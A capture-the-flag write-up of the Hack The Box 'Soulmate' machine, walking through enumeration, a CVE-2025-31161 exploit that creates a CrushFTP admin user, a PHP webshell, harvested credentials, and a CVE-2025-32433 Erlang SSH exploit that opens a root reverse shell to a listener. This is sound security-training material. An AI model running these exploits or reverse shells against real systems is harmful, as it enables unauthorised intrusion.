# Soulmate

## 1. Introduction

### 1.1 Background

The **Soulmate** machine from **Hack The Box** is an _Easy_ Linux environment that focuses on the enumeration and exploitation of a dating-themed web application, in addition to an exposed SSH service.

The main objective is to identify vulnerabilities within the application to gain initial access to the system and then perform privilege escalation until compromising the root account.

### 1.1 Objectives

During the resolution of this machine, the following concepts are reinforced:

- Application of a **structured enumeration methodology**.
- Identification and exploitation of **web vulnerabilities**.
- Obtaining initial access in Linux environments.
- Analysis of insecure configurations.  
- Basic **privilege escalation** techniques.

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by verifying connectivity:

```bash
❯ ping -c1 soulmate.htb
```

The host responds correctly, confirming that it is active.

### 2.2 Nmap

Full port scan:

```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 soulmate.htb -oN allports --open
```

Result:

- 22/tcp – SSH
- 80/tcp – HTTP

Afterwards, a detailed scan of services and versions is performed:

```bash
❯ nmap -p22,80 -Pn -sCV -oN targeted soulmate.htb
```

Relevant results:

- **SSH**: OpenSSH 8.9p1 (Ubuntu)
- **HTTP**: nginx 1.18.0 (Ubuntu)
- The site title is: _Soulmate - Find Your Perfect Match_
- PHPSESSID cookie without the `httponly` flag

### 2.3 Gobuster

Virtual host enumeration is performed:

```bash
❯ gobuster vhost --domain 'soulmate.htb' --append-domain \
-u http://10.129.3.237 \
-w /usr/share/seclists/Discovery/DNS/namelist.txt \
-t 100 -o vhost.txt
```

Discovered:

```
ftp.soulmate.htb → 302 → /WebInterface/login.html
```

<img width="1888" height="696" alt="image" src="https://github.com/user-attachments/assets/b4a39a7c-f7f5-40d0-8276-4c9fc1fe6d7b" />

## 3. Exploitation

### 3.1 Initial Exploitation

A version associated with the application is identified in the source code:

<img width="661" height="212" alt="image" src="https://github.com/user-attachments/assets/1bd04344-f9c3-4c57-9588-79ef569c09c6" />

A possible vector associated with a vulnerable service is identified and the exploit is tested:

<img width="1380" height="488" alt="image" src="https://github.com/user-attachments/assets/3abc9c58-fd4a-4c0c-92fa-0cd226329ad0" />

```bash
❯ python3 52295.py --target ftp.soulmate.htb --port 80 --exploit --new-user nuggetito --password nuggetito67

[36m          
  / ____/______  _______/ /_  / ____/ /_____ 
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/ 
                                    /_/      
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user nuggetito on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb
```

Result:

```
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```

Valid access is obtained.

<img width="1177" height="729" alt="image" src="https://github.com/user-attachments/assets/ba527fbb-b810-451d-b43e-d9187d6c09bb" />

Access was assigned to the account:  
*Admin > User Manager*  
(https://benheater.com/content/images/2025/09/image-39-1.png)

<img width="1460" height="732" alt="image" src="https://github.com/user-attachments/assets/127abf7f-fe37-4fc5-9d0b-08fde2acd4c6" />

### 3.2 Obtaining a Webshell

A PHP webshell is downloaded:

```bash
❯ wget https://github.com/WhiteWinterWolf/wwwolf-php-
```

After uploading and executing it, a reverse shell is obtained:

```bash
❯ sudo nc -lnvp 443
```

Received connection:

```
❯ www-data@soulmate
```

### 3.3 Abuse of File Read Functionality via Database

During system exploration:

```bash
❯ cd data
❯ sqlite3 soulmate.db .dump
```

Relevant information is obtained:

```
INSERT INTO users VALUES(
1,'admin',
'$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',
1,'Administrator',...
);
```

Additionally, reviewing the source code shows the automatic creation of the admin user with the password:

```
Crush4dmin990
```

### 3.4 Lateral Movement

Exploring local processes and files:

```bash
❯ cat /usr/local/lib/erlang_login/start.escript
```

New credentials are found:

```
ben:HouseH0ldings998
```

SSH access:

```bash
❯ ssh ben@10.129.3.237
```

The user flag is obtained:

```
ben@soulmate:~$ ls
user.txt
```

## 4. Privilege Escalation

When reviewing local services:

```bash
❯ nc 127.0.0.1 2222
```

The following is identified:

```
SSH-2.0-Erlang/5.2.9
```

A public exploit is located:  
`CVE-2025-32433 – Erlang OTP SSH RCE`

On the victim machine, the following is executed:

```bash
❯ python3 cve-2025-32433.py -p 2222 --shell \
--lhost 10.10.15.4 --lport 9001 127.0.0.1
```

On the attacker machine:

```bash
❯ nc -lvnp 9001
```

Received connection:

```
whoami
root
```

Successful root access is obtained.
